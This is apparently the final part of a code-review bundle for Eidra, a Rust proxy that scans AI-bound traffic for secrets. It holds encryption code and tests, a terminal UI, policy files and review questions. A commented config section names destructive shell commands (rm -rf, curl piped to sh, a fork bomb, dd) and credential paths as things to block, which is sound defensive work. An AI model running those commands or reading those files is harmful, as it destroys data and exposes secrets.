    }

    #[test]
    fn decrypt_with_wrong_key_fails() {
        let key = [42u8; 32];
        let wrong_key = [99u8; 32];
        let plaintext = b"secret data";

        let encrypted = encrypt(&key, plaintext).expect("encryption should succeed");
        let result = decrypt(&wrong_key, &encrypted);
        assert!(result.is_err());
    }

    #[test]
    fn key_exchange_produces_shared_secret() {
        let alice = generate_keypair();
        let bob = generate_keypair();

        let alice_shared = derive_shared_secret(alice.secret_key(), &bob.public_key);
        let bob_shared = derive_shared_secret(bob.secret_key(), &alice.public_key);

        assert_eq!(alice_shared.as_bytes(), bob_shared.as_bytes());
    }

    #[test]
    fn encrypt_decrypt_with_derived_key() {
        let alice = generate_keypair();
        let bob = generate_keypair();

        let shared = derive_shared_secret(alice.secret_key(), &bob.public_key);
        let key: [u8; 32] = *shared.as_bytes();

        let plaintext = b"agent-to-agent encrypted message";
        let encrypted = encrypt(&key, plaintext).expect("encryption should succeed");
        let decrypted = decrypt(&key, &encrypted).expect("decryption should succeed");
        assert_eq!(decrypted, plaintext);
    }

    #[test]
    fn decrypt_too_short_data_fails() {
        let key = [0u8; 32];
        let result = decrypt(&key, &[1, 2, 3]);
        assert!(result.is_err());
    }
}
```

### crates/eidra-transport/src/error.rs
```rust
use thiserror::Error;

/// Errors that can occur in the transport layer.
#[derive(Debug, Error)]
pub enum TransportError {
    /// Cryptographic operation failed.
    #[error("crypto error: {0}")]
    Crypto(String),

    /// I/O error.
    #[error("io error: {0}")]
    Io(String),

    /// The room has expired.
    #[error("room expired")]
    RoomExpired,

    /// The room was not found.
    #[error("room not found")]
    RoomNotFound,

    /// A peer disconnected unexpectedly.
    #[error("peer disconnected")]
    PeerDisconnected,

    /// Custom error.
    #[error("{0}")]
    Custom(String),
}

pub type Result<T> = std::result::Result<T, TransportError>;
```

### crates/eidra-transport/src/lib.rs
```rust
pub mod crypto;
pub mod error;
pub mod room;
pub mod types;
```

### crates/eidra-transport/src/room.rs
```rust
use chrono::{DateTime, Duration, Utc};
use rand::Rng;

use crate::crypto::{self, KeyPair};
use crate::types::{RoomConfig, RoomId};

/// Characters used to generate room IDs.
const ROOM_ID_CHARS: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
/// Length of a room ID.
const ROOM_ID_LEN: usize = 4;

/// A secure E2EE room.
pub struct Room {
    /// The room's unique identifier (4-char alphanumeric).
    pub id: RoomId,
    /// When the room was created.
    pub created_at: DateTime<Utc>,
    /// When the room expires.
    pub expires_at: DateTime<Utc>,
    /// Room configuration.
    pub config: RoomConfig,
    /// The room's X25519 key pair for E2EE.
    pub keypair: KeyPair,
}

impl Room {
    /// Create a new secure room with the given configuration.
    pub fn create(config: RoomConfig) -> Self {
        let now = Utc::now();
        let expires_at = now + Duration::seconds(config.ttl_secs as i64);
        let id = generate_room_id();
        let keypair = crypto::generate_keypair();

        Self {
            id,
            created_at: now,
            expires_at,
            config,
            keypair,
        }
    }

    /// Check if this room has expired.
    pub fn is_expired(&self) -> bool {
        Utc::now() > self.expires_at
    }
}

/// Generate a random 4-character alphanumeric room ID.
pub fn generate_room_id() -> String {
    let mut rng = rand::thread_rng();
    (0..ROOM_ID_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..ROOM_ID_CHARS.len());
            ROOM_ID_CHARS[idx] as char
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn room_id_is_4_chars() {
        let id = generate_room_id();
        assert_eq!(id.len(), 4);
        assert!(id.chars().all(|c| c.is_ascii_alphanumeric()));
    }

    #[test]
    fn room_create_with_defaults() {
        let room = Room::create(RoomConfig::default());
        assert_eq!(room.id.len(), 4);
        assert!(!room.is_expired());
        assert_eq!(room.config.ttl_secs, 1800);
        assert_eq!(room.config.max_participants, 2);
    }

    #[test]
    fn room_expiry() {
        let config = RoomConfig {
            ttl_secs: 0,
            max_participants: 2,
        };
        let room = Room::create(config);
        // With 0 TTL, room should be expired (or just at the boundary)
        // Sleep is not ideal in tests, so we check the expires_at is <= now
        assert!(room.expires_at <= Utc::now());
    }
}
```

### crates/eidra-transport/src/types.rs
```rust
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

/// A 4-character alphanumeric room identifier.
pub type RoomId = String;

/// Configuration for a secure room.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RoomConfig {
    /// Time-to-live in seconds. Default: 1800 (30 minutes).
    pub ttl_secs: u64,
    /// Maximum number of participants. Default: 2.
    pub max_participants: usize,
}

impl Default for RoomConfig {
    fn default() -> Self {
        Self {
            ttl_secs: 1800,
            max_participants: 2,
        }
    }
}

/// An encrypted message exchanged through a secure room.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Message {
    /// Unique message identifier.
    pub id: String,
    /// Sender identifier (device hash or room participant id).
    pub sender: String,
    /// Encrypted payload bytes.
    pub payload: Vec<u8>,
    /// Timestamp when the message was created.
    pub timestamp: DateTime<Utc>,
}

impl Message {
    /// Create a new message with the given sender and encrypted payload.
    pub fn new(sender: impl Into<String>, payload: Vec<u8>) -> Self {
        Self {
            id: Uuid::new_v4().to_string(),
            sender: sender.into(),
            payload,
            timestamp: Utc::now(),
        }
    }
}
```

### crates/eidra-tui/src/app.rs
```rust
use crate::event::{RequestEntry, Statistics};

pub struct TuiApp {
    pub entries: Vec<RequestEntry>,
    pub stats: Statistics,
    pub selected_index: usize,
    pub should_quit: bool,
    pub scroll_offset: usize,
    pub uptime_secs: u64,
}

impl TuiApp {
    pub fn new() -> Self {
        Self {
            entries: Vec::new(),
            stats: Statistics::default(),
            selected_index: 0,
            should_quit: false,
            scroll_offset: 0,
            uptime_secs: 0,
        }
    }

    pub fn add_entry(&mut self, entry: RequestEntry) {
        self.stats.record(&entry);
        self.entries.push(entry);
    }

    pub fn scroll_up(&mut self) {
        if self.selected_index > 0 {
            self.selected_index -= 1;
        }
    }

    pub fn scroll_down(&mut self) {
        if self.selected_index < self.entries.len().saturating_sub(1) {
            self.selected_index += 1;
        }
    }
}

impl Default for TuiApp {
    fn default() -> Self {
        Self::new()
    }
}
```

### crates/eidra-tui/src/event.rs
```rust
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RequestEntry {
    pub timestamp: DateTime<Utc>,
    pub action: RequestAction,
    pub provider: String,
    pub findings_count: u32,
    pub categories: Vec<String>,
    pub data_size_bytes: u64,
    pub latency_ms: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum RequestAction {
    Allow,
    Mask,
    Block,
    Escalate,
}

impl std::fmt::Display for RequestAction {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Allow => write!(f, "✓ ALLOW"),
            Self::Mask => write!(f, "◐ MASK"),
            Self::Block => write!(f, "✗ BLOCK"),
            Self::Escalate => write!(f, "⚡ ESCALATE"),
        }
    }
}

#[derive(Debug, Clone, Default)]
pub struct Statistics {
    pub total_requests: u64,
    pub allowed: u64,
    pub masked: u64,
    pub blocked: u64,
    pub total_findings: u64,
    pub categories: std::collections::HashMap<String, u64>,
}

impl Statistics {
    pub fn record(&mut self, entry: &RequestEntry) {
        self.total_requests += 1;
        self.total_findings += entry.findings_count as u64;
        match entry.action {
            RequestAction::Allow => self.allowed += 1,
            RequestAction::Mask => self.masked += 1,
            RequestAction::Block => self.blocked += 1,
            RequestAction::Escalate => {}
        }
        for cat in &entry.categories {
            *self.categories.entry(cat.clone()).or_insert(0) += 1;
        }
    }
}
```

### crates/eidra-tui/src/lib.rs
```rust
pub mod app;
pub mod event;
pub mod ui;
```

### crates/eidra-tui/src/ui.rs
```rust
use ratatui::layout::{Constraint, Direction, Layout, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Bar, BarChart, BarGroup, Block, Borders, List, ListItem, Paragraph};
use ratatui::Frame;

use crate::app::TuiApp;
use crate::event::RequestAction;

pub fn render(frame: &mut Frame, app: &TuiApp) {
    let chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Length(3),  // Status bar
            Constraint::Min(10),    // Live stream
            Constraint::Length(12), // Stats panel
            Constraint::Length(1),  // Help bar
        ])
        .split(frame.area());

    render_status_bar(frame, app, chunks[0]);
    render_live_stream(frame, app, chunks[1]);
    render_stats(frame, app, chunks[2]);
    render_help_bar(frame, chunks[3]);
}

fn render_status_bar(frame: &mut Frame, app: &TuiApp, area: Rect) {
    let uptime = if app.stats.total_requests > 0 {
        format!("Uptime: {}s", app.uptime_secs)
    } else {
        "Waiting for requests...".to_string()
    };

    let status = vec![
        Span::styled(
            " ◆ EIDRA ",
            Style::default()
                .fg(Color::Black)
                .bg(Color::Cyan)
                .add_modifier(Modifier::BOLD),
        ),
        Span::raw("  "),
        Span::styled("● Proxy: active", Style::default().fg(Color::Green)),
        Span::raw("  │  "),
        Span::styled(
            format!("Requests: {}", app.stats.total_requests),
            Style::default().fg(Color::White),
        ),
        Span::raw("  │  "),
        Span::styled(
            format!("✓{}", app.stats.allowed),
            Style::default().fg(Color::Green),
        ),
        Span::raw(" "),
        Span::styled(
            format!("◐{}", app.stats.masked),
            Style::default().fg(Color::Yellow),
        ),
        Span::raw(" "),
        Span::styled(
            format!("✗{}", app.stats.blocked),
            Style::default().fg(Color::Red),
        ),
        Span::raw("  │  "),
        Span::styled(
            format!("Findings: {}", app.stats.total_findings),
            Style::default().fg(Color::Magenta),
        ),
        Span::raw("  │  "),
        Span::styled(uptime, Style::default().fg(Color::DarkGray)),
    ];

    let paragraph = Paragraph::new(Line::from(status)).block(
        Block::default()
            .borders(Borders::ALL)
            .border_style(Style::default().fg(Color::Cyan)),
    );
    frame.render_widget(paragraph, area);
}

fn render_live_stream(frame: &mut Frame, app: &TuiApp, area: Rect) {
    if app.entries.is_empty() {
        let empty_msg = Paragraph::new(vec![
            Line::from(""),
            Line::from(""),
            Line::from(vec![Span::styled(
                "  Listening on proxy... ",
                Style::default().fg(Color::DarkGray),
            )]),
            Line::from(""),
            Line::from(vec![
                Span::styled("  Set your proxy:  ", Style::default().fg(Color::DarkGray)),
                Span::styled(
                    "export HTTPS_PROXY=http://127.0.0.1:8080",
                    Style::default().fg(Color::Cyan),
                ),
            ]),
            Line::from(vec![
                Span::styled("  Or scan a file:  ", Style::default().fg(Color::DarkGray)),
                Span::styled("eidra scan <file>", Style::default().fg(Color::Cyan)),
            ]),
        ])
        .block(
            Block::default()
                .title(" Live Request Stream ")
                .title_style(
                    Style::default()
                        .fg(Color::Cyan)
                        .add_modifier(Modifier::BOLD),
                )
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::DarkGray)),
        );
        frame.render_widget(empty_msg, area);
        return;
    }

    let items: Vec<ListItem> = app
        .entries
        .iter()
        .rev()
        .flat_map(|entry| {
            let (action_style, action_str) = match entry.action {
                RequestAction::Allow => (Style::default().fg(Color::Green), "✓ ALLOW "),
                RequestAction::Mask => (
                    Style::default()
                        .fg(Color::Yellow)
                        .add_modifier(Modifier::BOLD),
                    "◐ MASK  ",
                ),
                RequestAction::Block => (
                    Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
                    "✗ BLOCK ",
                ),
                RequestAction::Escalate => (
                    Style::default()
                        .fg(Color::Magenta)
                        .add_modifier(Modifier::BOLD),
                    "⚡ ESC   ",
                ),
            };

            let time = entry.timestamp.format("%H:%M:%S").to_string();
            let size = format_size(entry.data_size_bytes);

            let mut lines = vec![ListItem::new(Line::from(vec![
                Span::styled(format!(" {} ", time), Style::default().fg(Color::DarkGray)),
                Span::styled(action_str, action_style),
                Span::styled(
                    format!(" {} ", entry.provider),
                    Style::default().fg(Color::Cyan),
                ),
                Span::styled(format!(" {} ", size), Style::default().fg(Color::DarkGray)),
                if entry.findings_count > 0 {
                    Span::styled(
                        format!(" {} findings ", entry.findings_count),
                        Style::default()
                            .fg(Color::Yellow)
                            .add_modifier(Modifier::BOLD),
                    )
                } else {
                    Span::styled(" clean ", Style::default().fg(Color::Green))
                },
            ]))];

            // Show finding categories as sub-lines with tree connector
            for (i, cat) in entry.categories.iter().enumerate() {
                let connector = if i == entry.categories.len() - 1 {
                    "└─"
                } else {
                    "├─"
                };
                lines.push(ListItem::new(Line::from(vec![
                    Span::styled(
                        format!("                {} ", connector),
                        Style::default().fg(Color::DarkGray),
                    ),
                    Span::styled(cat.clone(), Style::default().fg(Color::Yellow)),
                ])));
            }

            lines
        })
        .collect();

    let list = List::new(items).block(
        Block::default()
            .title(" Live Request Stream ")
            .title_style(
                Style::default()
                    .fg(Color::Cyan)
                    .add_modifier(Modifier::BOLD),
            )
            .borders(Borders::ALL)
            .border_style(Style::default().fg(Color::DarkGray)),
    );
    frame.render_widget(list, area);
}

fn render_stats(frame: &mut Frame, app: &TuiApp, area: Rect) {
    let chunks = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(40), Constraint::Percentage(60)])
        .split(area);

    // Actions bar chart
    let action_data = [
        ("Allow", app.stats.allowed),
        ("Mask", app.stats.masked),
        ("Block", app.stats.blocked),
    ];

    let bars: Vec<Bar> = action_data
        .iter()
        .map(|(label, value)| {
            let color = match *label {
                "Allow" => Color::Green,
                "Mask" => Color::Yellow,
                "Block" => Color::Red,
                _ => Color::White,
            };
            Bar::default()
                .value(*value)
                .label(Line::from(*label))
                .style(Style::default().fg(color))
        })
        .collect();

    let barchart = BarChart::default()
        .block(
            Block::default()
                .title(" Actions ")
                .title_style(Style::default().fg(Color::Cyan))
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::DarkGray)),
        )
        .data(BarGroup::default().bars(&bars))
        .bar_width(8)
        .bar_gap(2);
    frame.render_widget(barchart, chunks[0]);

    // Categories list with visual bars
    let mut sorted_cats: Vec<_> = app.stats.categories.iter().collect();
    sorted_cats.sort_by(|a, b| b.1.cmp(a.1));
    let max_count = sorted_cats.first().map(|(_, c)| **c).unwrap_or(1).max(1);

    let cat_items: Vec<ListItem> = sorted_cats
        .iter()
        .take(8)
        .map(|(cat, count)| {
            let bar_len = (**count as f64 / max_count as f64 * 20.0) as usize;
            let bar = "█".repeat(bar_len);
            ListItem::new(Line::from(vec![
                Span::styled(
                    format!(" {:>4} ", count),
                    Style::default().fg(Color::Yellow),
                ),
                Span::styled(format!("{:<20}", bar), Style::default().fg(Color::Yellow)),
                Span::raw(" "),
                Span::styled(cat.to_string(), Style::default().fg(Color::White)),
            ]))
        })
        .collect();

    let cat_list = List::new(cat_items).block(
        Block::default()
            .title(" Findings by Category ")
            .title_style(Style::default().fg(Color::Cyan))
            .borders(Borders::ALL)
            .border_style(Style::default().fg(Color::DarkGray)),
    );
    frame.render_widget(cat_list, chunks[1]);
}

fn render_help_bar(frame: &mut Frame, area: Rect) {
    let help = Line::from(vec![
        Span::styled(
            " j/k",
            Style::default()
                .fg(Color::Cyan)
                .add_modifier(Modifier::BOLD),
        ),
        Span::styled(" scroll  ", Style::default().fg(Color::DarkGray)),
        Span::styled(
            "q",
            Style::default()
                .fg(Color::Cyan)
                .add_modifier(Modifier::BOLD),
        ),
        Span::styled(" quit  ", Style::default().fg(Color::DarkGray)),
        Span::styled("Eidra v0.1.0", Style::default().fg(Color::DarkGray)),
        Span::raw("  "),
        Span::styled(
            "Your edge sees everything. Protects everything.",
            Style::default().fg(Color::DarkGray),
        ),
    ]);
    frame.render_widget(Paragraph::new(help), area);
}

fn format_size(bytes: u64) -> String {
    if bytes < 1024 {
        format!("{}B", bytes)
    } else if bytes < 1024 * 1024 {
        format!("{:.1}KB", bytes as f64 / 1024.0)
    } else {
        format!("{:.1}MB", bytes as f64 / (1024.0 * 1024.0))
    }
}
```

### sdks/eidra-rs/src/lib.rs
```rust
//! # Eidra SDK
//!
//! Re-exports core Eidra crates for easy integration into Rust projects.
//!
//! ```rust,no_run
//! use eidra_rs::scan::scanner::Scanner;
//!
//! let scanner = Scanner::with_defaults();
//! let findings = scanner.scan("my secret AKIAIOSFODNN7EXAMPLE");
//! println!("{} findings", findings.len());
//! ```

/// Data classification engine — scan text for secrets, PII, and sensitive data.
pub use eidra_scan as scan;

/// Policy evaluation engine — YAML-based rules for mask/block/allow/route.
pub use eidra_policy as policy;

/// E2EE transport — X25519 key exchange + ChaCha20-Poly1305 encryption.
pub use eidra_transport as transport;

/// Device-bound identity — key generation and credential wallet.
pub use eidra_identity as identity;
```

---
## Config Files
### config/default.yaml
```yaml
version: "1"
proxy:
  listen: "127.0.0.1:8080"
  max_body_size: 10485760  # 10MB

scan:
  enabled: true
  custom_rules_path: ""

local_llm:
  enabled: false
  provider: ollama
  endpoint: "http://localhost:11434"
  model_mapping:
    default: "qwen2.5:latest"

mcp_gateway:
  enabled: false
  listen: "127.0.0.1:8081"
  # Default semantic RBAC rules (uncomment and customize per server):
  # server_whitelist:
  #   my_server:
  #     name: "my_server"
  #     endpoint: "http://localhost:9000"
  #     tool_rules:
  #       - tool: "execute_sql"
  #         block_patterns: ["(?i)\\b(DROP|DELETE|TRUNCATE|ALTER|INSERT|UPDATE)\\b"]
  #         description: "Block mutating SQL (read-only by default)"
  #       - tool: "read_file"
  #         blocked_paths: ["~/.ssh/**", "~/.aws/**", "~/.gnupg/**", "**/.env", "**/.env.*", "/etc/shadow", "/etc/passwd"]
  #         description: "Block access to sensitive files"
  #       - tool: "write_file"
  #         blocked_paths: ["~/.ssh/**", "~/.aws/**", "**/.env", "/etc/**", "/usr/**"]
  #         description: "Block writes to system and credential files"
  #       - tool: "run_command"
  #         block_patterns: ["rm\\s+(-rf?|--recursive)", "curl.*\\|\\s*(sh|bash)", "wget.*\\|\\s*(sh|bash)", "chmod\\s+777", ":(){ :|:& };:", "mkfs\\.", "dd\\s+if="]
  #         description: "Block destructive shell commands"
  #       - tool: "*"
  #         block_patterns: ["(?i)(password|secret|token|api.?key)\\s*[:=]\\s*['\"]?[A-Za-z0-9]{8,}"]
  #         description: "Block secrets in any tool arguments"

audit:
  enabled: true
  db_path: "~/.eidra/audit.db"
```

### config/policies/default.yaml
```yaml
version: "1"
description: "Eidra default policy — block private keys, mask secrets, allow safe content"

rules:
  # Rule 1: Block private keys from leaving the device entirely
  - name: block_private_keys
    description: "Private keys must never leave the device"
    match:
      category:
        - private_key
        - ssh_private_key
        - rsa_private_key
        - ec_private_key
        - pgp_private_key
      severity: critical
    action: block
    message: "Private key detected — request blocked for your protection"

  # Rule 2: Mask API keys and tokens for cloud destinations
  - name: mask_api_keys_cloud
    description: "Mask API keys and tokens when sending to cloud LLMs"
    match:
      category:
        - api_key
        - aws_access_key
        - aws_secret_key
        - gcp_api_key
        - azure_key
        - github_token
        - gitlab_token
        - slack_token
        - stripe_key
        - openai_api_key
        - anthropic_api_key
        - generic_api_key
        - bearer_token
        - basic_auth
        - jwt_token
      destination: cloud
    action: mask
    message: "API key / token masked before sending to cloud"

  # Rule 3: Mask PII for cloud destinations
  - name: mask_pii_cloud
    description: "Mask personally identifiable information for cloud LLMs"
    match:
      category:
        - email_address
        - phone_number
        - credit_card
        - ssn
        - ip_address
        - japanese_my_number
        - japanese_phone
        - passport_number
      destination: cloud
    action: mask
    message: "PII masked before sending to cloud"

  # Rule 4: Allow PII for local LLMs (Ollama, etc.)
  - name: allow_pii_local
    description: "PII is allowed for local LLM processing — data stays on device"
    match:
      category:
        - email_address
        - phone_number
        - credit_card
        - ssn
        - ip_address
        - japanese_my_number
        - japanese_phone
        - passport_number
      destination: local
    action: allow
    message: "PII allowed — destination is local LLM"

  # Rule 5: Allow API keys for local LLMs
  - name: allow_api_keys_local
    description: "API keys are allowed for local LLM processing"
    match:
      category:
        - api_key
        - generic_api_key
        - bearer_token
      destination: local
    action: allow
    message: "API key allowed — destination is local LLM"

  # Rule 6: Mask database connection strings
  - name: mask_db_credentials
    description: "Mask database connection strings containing credentials"
    match:
      category:
        - database_url
        - connection_string
      severity: high
    action: mask
    message: "Database credentials masked"

  # Rule 7: Block high-entropy secrets
  - name: mask_high_entropy_secrets
    description: "Mask detected high-entropy strings that look like secrets"
    match:
      category:
        - high_entropy_string
      destination: cloud
    action: mask
    message: "Potential secret (high entropy) masked for cloud"

  # Default: allow everything else
  - name: default_allow
    description: "Allow all other content"
    match:
      category:
        - "*"
    action: allow
```

---
## Review Questions
1. Are there any remaining security vulnerabilities?
2. Is the Semantic RBAC implementation sound?
3. Is the hyper-native MITM refactoring correct?
4. Is the XChaCha20 + SAS implementation appropriate?
5. Is the README compelling for HN/GitHub?
6. What is the single biggest weakness remaining?
7. Is this ready for open-source release?
